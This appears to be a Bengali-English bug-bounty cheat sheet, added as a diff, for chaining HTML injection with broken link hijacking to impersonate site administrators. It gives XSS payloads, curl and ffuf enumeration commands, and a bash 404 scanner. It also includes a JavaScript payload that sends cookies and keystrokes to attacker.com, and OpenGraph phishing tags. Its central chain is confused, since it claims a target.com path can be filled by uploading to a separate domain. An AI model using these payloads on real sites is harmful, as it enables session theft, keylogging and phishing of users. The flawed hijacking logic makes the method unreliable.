@@ -1,0 +1,140 @@
+Content Spoofing + Broken Link Hijacking (BLH) খুঁজতে user-controlled content rendering আর external resource loading এ focus করো। এই combo টা impersonation এর জন্য powerful।
+
+🎯 Target Areas
+1. Email templates (user-controlled fields)
+2. Public profiles with external links/images
+3. Share links, referral pages
+4. Dynamic content: /profile/{user}, /post/{id}
+5. OpenGraph meta tags, favicons
+
+🔍 Step-by-Step Detection
+Step 1: Content Spoofing Discovery
+# User-controlled fields test করো
+Name: <img src=x onerror=alert(1)>
+Bio: "><script>alert(1)</script>
+Website: javascript:alert(1)
+
+# HTML injection points
+GET /profile?name=<svg onload=alert(1)>
+POST /update {"bio": "<img src=x onerror=alert(document.domain)>"}
+Step 2: Broken Link Hijacking Setup
+
+
+
+# Hijack common CDN/static resources
+1. https://target.com/js/app.js → 404? → Upload evil.js
+2. https://target.com/css/style.css → 404? → Upload phishing.css
+3. https://target.com/images/logo.png → 404? → Upload fake-logo.png
+4. https://target.com/favicon.ico → 404?
+🛠️ Testing Methodology
+Burp Workflow
+
+
+
+1. Spider → সব static assets enumerate করো
+2. Engagement → Broken link scanner
+3. Repeater → User input HTML injection test
+4. Collaborator → External resource loading track
+Resource Enumeration
+bash
+
+
+
+# সব common paths check করো
+curl -I "https://target.com/{js/app.js,css/main.css,images/logo.png,favicon.ico}"
+
+# Directory brute force (static assets)
+ffuf -u https://target.com/FUZZ \
+  -w /path/to/static-files.txt \
+  -fc 200,301,302
+🔥 Exploitation Chain (Impersonation)
+
+Step 1: BLH Setup
+1. target.com/js/tracking.js → 404 confirmed
+2. Upload: evil.com/js/tracking.js (your control)
+3. Content: phishing JS + pixel tracking
+
+Step 2: Content Spoofing Trigger
+Profile update:
+Name: "Admin Team"
+Bio: <script src="https://target.com/js/tracking.js"></script>
+Website: https://target.com/profile/evil-user
+
+Result: Victim এর browser target.com এর JS load করে (trusted context)
+Step 3: Impersonation Payload
+html
+
+
+
+<!-- evil.com/js/tracking.js -->
+(function(){
+  // Session steal
+  fetch('https://attacker.com/steal?cookie='+document.cookie);
+  
+  // Keylogger
+  document.addEventListener('keydown', e=> {
+    fetch('https://attacker.com/log?key='+e.key);
+  });
+})();
+📋 Proof of Concept Steps
+1. Enumerate: target.com/js/analytics.js → 404
+2. Control: Upload to your domain as analytics.js
+3. Injection: Update profile bio → <script src="/js/analytics.js">
+4. Victim visit: /profile/evil-user → JS executes in target.com context
+5. Impact: Session theft, keylogging, phishing
+
+🧪 cURL + HTML Testing
+bash
+# BLH validation
+curl -I "https://target.com/js/app.js" | grep "404"
+
+# Content spoofing test
+curl -X POST "https://target.com/profile/update" \
+  -d 'bio=<img src="https://attacker.com/pixel.gif">' \
+  -b "session=your_session"
+
+🔄 Bypass + Advanced Vectors
+1. OpenGraph Spoofing
+<meta property="og:image" content="https://attacker.com/fake-admin-profile.jpg">
+<meta property="og:title" content="Admin Login Required">
+<meta property="og:description" content="Click here to verify">
+
+2. Favicon Hijacking
+<link rel="icon" href="https://target.com/favicon.ico">
+→ 404 → attacker.com/favicon.ico (phishing page)
+
+3. CSS Background Images
+<style>
+.admin-profile { 
+  background: url(https://attacker.com/phish.jpg);
+}
+</style>
+
+💥 Impact Demonstration (Safe)
+✅ BLH: target.com/js/app.js → 404 → attacker.com/js/app.js
+✅ Spoofing: Profile bio accepts HTML/JS
+✅ PoC: <img src="https://collaborator.oastify.com/pixel.gif">
+✅ Hit: Collaborator callback confirmation
+✅ Scenario: Admin impersonation → credential theft
+
+🚀 Automation Script
+bash
+#!/bin/bash
+BLH_PATHS=(
+  "js/app.js" "js/tracking.js" "css/style.css"
+  "images/logo.png" "favicon.ico" "robots.txt"
+)
+
+for path in "${BLH_PATHS[@]}"; do
+  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path")
+  if [[ $status == "404" ]]; then
+    echo "[+] BLH Candidate: https://target.com/$path"
+  fi
+done
+
+⚠️ Report Template
+Title: Content Spoofing + BLH → Admin Impersonation
+CWE: CWE-79 (XSS) + CWE-829 (Inclusion of Functionality)
+CVSS: 8.1 (AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
+PoC: [Video: Victim clicks profile → collaborator hit]
+Key Insight: Public profile যেখানে bio/website field আছে + static asset 404 = instant BLH opportunity। Email notification features চেক করো priority।
